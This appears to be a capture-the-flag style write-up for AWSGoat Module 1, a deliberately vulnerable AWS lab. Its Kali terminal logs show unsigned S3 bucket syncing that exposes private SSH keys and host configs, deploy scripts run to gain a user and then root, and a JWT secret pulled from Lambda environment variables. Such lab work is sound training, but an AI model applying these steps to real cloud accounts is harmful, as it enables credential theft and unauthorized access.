# Module 1
````
┌──(kali㉿kali)-[~]
└─$ aws s3 ls                                                             
2023-10-11 10:41:38 dev-blog-awsgoat-bucket-315333988455
2023-10-11 10:41:37 do-not-delete-awsgoat-state-files-315333988455
2023-09-28 11:32:40 inebucketlou
2023-09-25 09:36:20 mynonvulnerablebucket
2023-09-25 09:35:21 myvulnerablebucket
2023-10-11 10:41:37 production-blog-awsgoat-bucket-315333988455
````

````
┌──(kali㉿kali)-[~]
└─$ aws s3 sync s3://dev-blog-awsgoat-bucket-315333988455/ . --region us-east-1 --no-sign-request
warning: Skipping file /home/kali/.mozilla/firefox/xtu1la9j.default-esr/lock. File does not exist.
warning: Skipping file /home/kali/Labs/AWSGoat/module1/shared/scripts/.ssh. File/Directory is not readable.
download: s3://dev-blog-awsgoat-bucket-315333988455/asset-manifest.json to ./asset-manifest.json
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/alice.pem to shared/files/.ssh/keys/alice.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/bob.pem to shared/files/.ssh/keys/bob.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/VincentVanGoat.pub to shared/files/.ssh/keys/VincentVanGoat.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/manifest.json to ./manifest.json
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/VincentVanGoat.pem to shared/files/.ssh/keys/VincentVanGoat.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/alice.pub to shared/files/.ssh/keys/alice.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/index.html to ./index.html
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/config.txt to shared/files/.ssh/config.txt
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/charles.pem to shared/files/.ssh/keys/charles.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mary.pem to shared/files/.ssh/keys/mary.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/charles.pub to shared/files/.ssh/keys/charles.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/bob.pub to shared/files/.ssh/keys/bob.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mary.pub to shared/files/.ssh/keys/mary.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mike.pub to shared/files/.ssh/keys/mike.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/john.pem to shared/files/.ssh/keys/john.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mike.pem to shared/files/.ssh/keys/mike.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/scripts/deploy_node.sh to shared/scripts/deploy_node.sh
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/john.pub to shared/files/.ssh/keys/john.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/scripts/php-deploy.sh to shared/scripts/php-deploy.sh
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/sophia.pub to shared/files/.ssh/keys/sophia.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/scripts/wordpress_deploy.sh to shared/scripts/wordpress_deploy.sh
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/sophia.pem to shared/files/.ssh/keys/sophia.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/static/js/787.8c65ad62.chunk.js.map to static/js/787.8c65ad62.chunk.js.map
download: s3://dev-blog-awsgoat-bucket-315333988455/static/js/787.8c65ad62.chunk.js to static/js/787.8c65ad62.chunk.js
````
User pwned
````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ cd shared      
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1/shared]
└─$ cd scripts 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ ls
deploy_node.sh  php-deploy.sh  wordpress_deploy.sh
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ sh deploy_node.sh                     
[sudo] password for kali: 
info: Adding user `bob' ...
info: Selecting UID/GID from range 1000 to 59999 ...
info: Adding new group `bob' (1001) ...
info: Adding new user `bob' (1001) with group `bob (1001)' ...
info: Creating home directory `/home/bob' ...
info: Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for bob
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] 
info: Adding new user `bob' to supplemental / extra groups `users' ...
info: Adding user `bob' to group `users' ...
┌──(bob㉿kali)-[~]
└─$ whoami                                                                                                                                                                                                                                  
bob

````
Root pwned
````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ cd shared 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1/shared]
└─$ cd scripts  
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ ls
deploy_node.sh  php-deploy.sh  wordpress_deploy.sh
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ sh wordpress_deploy.sh 
┌──(root㉿kali)-[/home/…/AWSGoat/module1/shared/scripts]
└─# whoami
root
````
Keys of users
````
──(kali㉿kali)-[~/…/module1/shared/files/.ssh]
└─$ ls
config.txt  keys
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/module1/shared/files/.ssh]
└─$ cat config.txt 
Host 10.25.14.6
  HostName alice
  Port 22
  IdentityFile /shared/files/.ssh/keys/alice.pem
  User alice
  
Host 34.207.133.229
  HostName bob
  Port 22
  IdentityFile /shared/files/.ssh/keys/bob.pem
  User bob

Host 184.73.142.5
  HostName VincentVanGoat
  Port 22
  IdentityFile /shared/files/.ssh/keys/VincentVanGoat.pem
  User VincentVanGoat

Host 10.25.14.106
  HostName charles
  Port 22
  IdentityFile /shared/files/.ssh/keys/charles.pem
  User charles

Host 172.16.84.59
  HostName john
  Port 22
  IdentityFile /shared/files/.ssh/keys/john.pem
  User john

Host 172.16.87.25
  HostName mary
  Port 22
  IdentityFile /shared/files/.ssh/keys/mary.pem
  User mary

Host 172.22.26.8
  HostName mike
  Port 22
  IdentityFile /shared/files/.ssh/keys/mike.pem
  User mike

Host 10.0.48.71
  HostName sophia
  Port 22
  IdentityFile /shared/files/.ssh/keys/sophia.pem
  User sophia                                   
````

## Lambda

````
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ aws lambda list-functions --region us-east-1
{
    "Functions": [
        {
            "FunctionName": "blog-application-data",
            "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application-data",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::315333988455:role/blog_app_lambda_data",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 5622,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 256,
            "LastModified": "2023-10-11T09:42:05.396+0000",
            "CodeSha256": "Fv+wneeKLjHQ/l2vFh4RagWabMWrfrGYS2JWKXAH3JQ=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "JWT_SECRET": "T2BYL6#]zc>Byuzu"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8bc046a5-1d69-4927-af67-8d2fef80bee2",
            "Layers": [
                {
                    "Arn": "arn:aws:lambda:us-east-1:315333988455:layer:bcrypt-pyjwt:1",
                    "CodeSize": 958331
                }
            ],
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        },
        {
            "FunctionName": "blog-application",
            "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application",
            "Runtime": "nodejs14.x",
            "Role": "arn:aws:iam::315333988455:role/blog_app_lambda",
            "Handler": "index.handler",
            "CodeSize": 416087,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-10-11T09:42:24.184+0000",
            "CodeSha256": "Rg+u4EXXP+oOnvXNgLjnm/ZH1fVbOfCjNa/k4Qy37XA=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8945f303-0759-4f25-9a84-b5ef7af95ba4",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
````
Found JWT Secret:

            "Environment": {
                "Variables": {
                    "JWT_SECRET": "T2BYL6#]zc>Byuzu"
                }
            },
